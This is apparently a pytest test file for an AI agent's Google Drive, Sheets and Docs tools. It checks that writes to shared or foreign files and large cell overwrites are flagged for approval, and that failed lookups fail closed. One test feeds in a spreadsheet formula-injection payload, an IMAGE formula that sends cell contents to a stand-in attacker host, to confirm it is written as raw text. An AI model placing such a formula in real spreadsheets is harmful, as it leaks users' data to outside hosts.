"""Spec 4.1: writes to a file someone else owns or can see are OUTWARD; overwriting 20+ filled cells is
DESTRUCTIVE; any lookup failure fails closed. All lookups go through the fake provider."""

from __future__ import annotations

import pytest

from mavis.domain.errors import ApprovalRequired
from mavis.domain.integrations import ConnectionState, ToolResult
from mavis.domain.policy import RiskClass
from mavis.store.repo import users
from mavis.tools.integrations import actions as a
from mavis.tools.integrations import tools as tools_mod
from mavis.tools.integrations.actions import GOOGLE_CAPABILITIES
from mavis.tools.integrations.composio_map import COMPOSIO_ACTIONS, input_option
from mavis.tools.integrations.tools import register_integration_tools
from mavis.tools.integrations.workspace_guard import (
    UNKNOWN_NOTE,
    created_ids,
    file_meta,
    ownership,
    prepare_cells,
    prepare_doc_write,
    prepare_row,
    target_range,
    update_workspace_state,
)
from mavis.tools.integrations.workspace_render import render_created
from mavis.tools.integrations.workspace_tools import docs_append, drive_share
from mavis.tools.registry import ToolContext, ToolRegistry, ToolRun, current_run

ME = "jai@example.com"
OWNER_ME = {"id": "p1", "type": "user", "role": "owner", "emailAddress": ME}
OWNER_OTHER = {"id": "p2", "type": "user", "role": "owner", "emailAddress": "priya@example.com"}
WRITER_ME = {"id": "p3", "type": "user", "role": "writer", "emailAddress": ME}
READER_OTHER = {"id": "p4", "type": "user", "role": "reader", "emailAddress": "ravi@example.com"}
ROW = a.SheetAppendArgs(spreadsheet_id="s1", values=["x"])


@pytest.fixture
def google(provider, cache, monkeypatch, user):
    for c in GOOGLE_CAPABILITIES:
        provider.set_state(user.id, c, ConnectionState.ACTIVE)
    monkeypatch.setattr(tools_mod, "_deps", lambda p, c: (provider, cache))
    provider.results["mail.profile"] = ToolResult(ok=True, data={"response_data": {"emailAddress": ME}})
    provider.results["drive.meta"] = ToolResult(ok=True, data={
        "id": "s1", "name": "Budget", "mimeType": "application/vnd.google-apps.spreadsheet"})
    return provider


def perms(provider, *entries):
    provider.results["drive.permissions"] = ToolResult(ok=True, data={"permissions": list(entries)})


def test_ownership_rules():
    assert ownership([{"role": "owner", "type": "user"}], "") == (True, False)  # only you can list it
    assert ownership([OWNER_ME, READER_OTHER], ME) == (True, True)
    assert ownership([OWNER_OTHER, WRITER_ME], ME) == (False, True)
    assert ownership([OWNER_ME, {"role": "reader", "type": "anyone"}], ME) == (True, True)
    assert ownership([OWNER_OTHER, WRITER_ME], "") == (False, True)
    assert ownership([OWNER_ME, {**READER_OTHER, "deleted": True}], ME) == (True, False)


def test_ownership_fails_closed_on_odd_lists():
    assert ownership([], ME) == (False, False)  # nothing listed: not provably yours
    shared_drive = [{"role": "organizer", "type": "user", "emailAddress": ME}]
    assert ownership(shared_drive, ME)[0] is False
    assert ownership([{**OWNER_ME, "emailAddress": "Jai@Example.com"}, READER_OTHER], "JAI@example.com") == (
        True, True)
    assert ownership([{"role": "owner", "type": "domain"}], "") == (True, True)


def test_target_range():
    assert target_range("Budget", "b2", rows=3, cols=2) == "'Budget'!B2:C4"
    assert target_range("Ravi's", "Z1", rows=1, cols=2) == "'Ravi''s'!Z1:AA1"


def test_sheets_translations_block_formula_injection():
    row = COMPOSIO_ACTIONS["sheets.append_row"].translate(
        a.SheetAppendArgs(spreadsheet_id="s1", values=["Lunch", 450]))
    assert row == {"spreadsheetId": "s1", "range": "Sheet1", "valueInputOption": "USER_ENTERED",
                   "insertDataOption": "INSERT_ROWS", "values": [["Lunch", 450]]}
    evil = COMPOSIO_ACTIONS["sheets.append_row"].translate(
        a.SheetAppendArgs(spreadsheet_id="s1", values=["=IMAGE(\"https://evil.example/?d=\"&A1)"]))
    assert evil["valueInputOption"] == "RAW"
    cells = COMPOSIO_ACTIONS["sheets.update_range"].translate(
        a.SheetUpdateArgs(spreadsheet_id="s1", sheet_name="Budget", start_cell="b2", values=[["a", 1]]))
    assert cells == {"spreadsheet_id": "s1", "sheet_name": "Budget", "first_cell_location": "B2",
                     "values": [["a", 1]], "valueInputOption": "USER_ENTERED"}
    assert COMPOSIO_ACTIONS["docs.insert_text"].translate(
        a.DocInsertArgs(document_id="d1", text="\nhi", index=29)) == {
        "document_id": "d1", "text_to_insert": "\nhi", "insertion_index": 29}


def test_input_option_checks_every_cell():
    assert input_option([["ok", 1], ["fine", "+44 20"]]) == "RAW"
    assert input_option(["@SUM(A1)"]) == "RAW"
    assert input_option([True, 1.5, -3, "plain"]) == "USER_ENTERED"


async def test_my_own_unshared_sheet_stays_write_self(google, user):
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    out = await prepare_row(ToolContext(user_id=user.id), ROW)
    assert out.risk is None and out.note == "File: Budget (Sheet), yours, only you have access"


async def test_shared_or_foreign_file_is_outward(google, user):
    ctx = ToolContext(user_id=user.id)
    perms(google, OWNER_ME, READER_OTHER)
    shared = await prepare_row(ctx, a.SheetAppendArgs(spreadsheet_id="s1", values=["x"]))
    assert shared.risk is RiskClass.OUTWARD and shared.note.endswith("yours, shared with others")
    perms(google, OWNER_OTHER, WRITER_ME)
    foreign = await prepare_doc_write(ctx, a.DocAppendArgs(document_id="s2", text="hi"))
    assert foreign.risk is RiskClass.OUTWARD and "owned by someone else" in foreign.note
    assert (await users.get_state(user.id))["workspace"]["email"] == ME  # looked up once, cached
    assert [e[1] for e in google.executed].count("mail.profile") == 1


async def test_permission_lookup_failure_is_outward(google, user):
    google.results["drive.permissions"] = ToolResult(ok=False, error="Composio answered 403 for POST /x")
    out = await prepare_doc_write(ToolContext(user_id=user.id), a.DocAppendArgs(document_id="d1", text="x"))
    assert out.risk is RiskClass.OUTWARD and out.note == UNKNOWN_NOTE


async def test_metadata_lookup_failure_is_outward(google, user):
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    google.results["drive.meta"] = ToolResult(ok=False, error="File not found")
    out = await prepare_row(ToolContext(user_id=user.id), ROW)
    assert out.risk is RiskClass.OUTWARD and out.note == UNKNOWN_NOTE


async def test_metadata_is_looked_up_once_per_run(google, user):
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    token = current_run.set(ToolRun())
    try:
        for _ in range(2):
            await prepare_row(ToolContext(user_id=user.id), ROW)
    finally:
        current_run.reset(token)
    assert [e[1] for e in google.executed].count("drive.meta") == 1


async def test_sharing_a_file_forgets_its_cached_facts(google, user):
    ctx = ToolContext(user_id=user.id)
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    token = current_run.set(ToolRun())
    try:
        assert (await file_meta(ctx, "s1")).shared_with_others is False
        await drive_share(ctx, a.DriveShareArgs(file_id="s1", email="priya@example.com"))
        perms(google, OWNER_ME, READER_OTHER)
        assert (await file_meta(ctx, "s1")).shared_with_others is True
    finally:
        current_run.reset(token)


async def test_overwriting_twenty_filled_cells_is_destructive(google, user):
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    filled = [[f"v{r}{c}" for c in range(4)] for r in range(5)]  # 20 non-empty cells
    google.results["sheets.read"] = ToolResult(ok=True, data={"spreadsheet_data": {"valueRanges": [
        {"range": "Budget!A1:D5", "values": filled}]}})
    args = a.SheetUpdateArgs(spreadsheet_id="s1", sheet_name="Budget", start_cell="A1",
                             values=[["x"] * 4 for _ in range(5)])
    out = await prepare_cells(ToolContext(user_id=user.id), args)
    assert out.risk is RiskClass.DESTRUCTIVE and out.note.endswith("This overwrites 20 filled cells.")
    assert google.executed[-1][2]["range"] == "'Budget'!A1:D5"
    google.results["sheets.read"] = ToolResult(ok=True, data={"spreadsheet_data": {"valueRanges": [
        {"range": "Budget!A1:D5", "values": [["a", "", "b"]]}]}})
    assert (await prepare_cells(ToolContext(user_id=user.id), args)).risk is None


async def test_unreadable_target_range_is_destructive(google, user):
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    google.results["sheets.read"] = ToolResult(ok=False, error="Unable to parse range")
    args = a.SheetUpdateArgs(spreadsheet_id="s1", sheet_name="Nope", start_cell="A1", values=[["x"]])
    assert (await prepare_cells(ToolContext(user_id=user.id), args)).risk is RiskClass.DESTRUCTIVE


async def test_unrecognised_range_reply_is_destructive(google, user):
    """A reply with no valueRanges is not proof the range is empty."""
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    google.results["sheets.read"] = ToolResult(ok=True, data={"something": "else"})
    args = a.SheetUpdateArgs(spreadsheet_id="s1", sheet_name="Budget", start_cell="A1", values=[[]])
    out = await prepare_cells(ToolContext(user_id=user.id), args)
    assert out.risk is RiskClass.DESTRUCTIVE and out.note.endswith("cells that may already hold data.")
    assert google.executed[-1][2]["range"] == "'Budget'!A1:A1"


async def test_docs_append_inserts_before_the_final_newline(google, user):
    google.results["docs.read"] = ToolResult(ok=True, data={"response_data": {"body": {"content": [
        {"endIndex": 1}, {"endIndex": 30}]}}})
    out = await docs_append(ToolContext(user_id=user.id), a.DocAppendArgs(document_id="d1", text="hello"))
    assert out == "Done. Added the text at the end of the document."
    assert google.executed[-1] == (user.id, "docs.insert_text", {"document_id": "d1", "text": "\nhello",
                                                                  "index": 29})


async def test_registry_queues_a_shared_sheet_append_with_the_verified_note(workspace_on, google, user):
    perms(google, OWNER_ME, READER_OTHER)
    registry = ToolRegistry()
    register_integration_tools(registry)
    tool = registry.get("sheets_append_row")
    with pytest.raises(ApprovalRequired) as exc:
        await registry.invoke(tool, user.id, a.SheetAppendArgs(spreadsheet_id="s1", values=["Lunch", 450]))
    assert exc.value.preview.endswith("File: Budget (Sheet), yours, shared with others")
    assert "sheets.append_row" not in [e[1] for e in google.executed]


async def test_registry_asks_before_appending_when_the_lookup_fails(workspace_on, google, user):
    google.results["drive.permissions"] = ToolResult(ok=False, error="Composio answered 500")
    registry = ToolRegistry()
    register_integration_tools(registry)
    with pytest.raises(ApprovalRequired) as exc:
        await registry.invoke(registry.get("docs_append"), user.id,
                              a.DocAppendArgs(document_id="d1", text="x"))
    assert exc.value.preview.endswith(UNKNOWN_NOTE)
    assert not {"docs.read", "docs.insert_text"} & {e[1] for e in google.executed}


async def test_registry_runs_an_append_to_my_own_private_sheet(workspace_on, google, user):
    perms(google, {"id": "p1", "type": "user", "role": "owner"})
    registry = ToolRegistry()
    register_integration_tools(registry)
    await registry.invoke(registry.get("sheets_append_row"), user.id,
                          a.SheetAppendArgs(spreadsheet_id="s1", values=["Lunch", 450]))
    assert google.executed[-1][1] == "sheets.append_row"


async def test_workspace_state_merges_sub_keys(user):
    """update_nested merges inside users' row lock (Postgres); SQLite tests can only show the merge."""
    await users.update_state(user.id, {"workspace": {"muted": ["comment:priya"]}, "other": 1})
    await update_workspace_state(user.id, {"email": ME})
    merged = await update_workspace_state(user.id, {"shared_after": "2026-10-03T00:00:00Z"})
    state = await users.get_state(user.id)
    assert state["workspace"] == merged == {"muted": ["comment:priya"], "email": ME,
                                            "shared_after": "2026-10-03T00:00:00Z"}
    assert state["other"] == 1


def test_created_ids_and_render_created_share_id_keys():
    data = {"response_data": {"documentId": "doc-9"}}
    assert created_ids(data) == ["doc-9"]
    assert render_created(data) == 'Done. {"documentId": "doc-9"}'
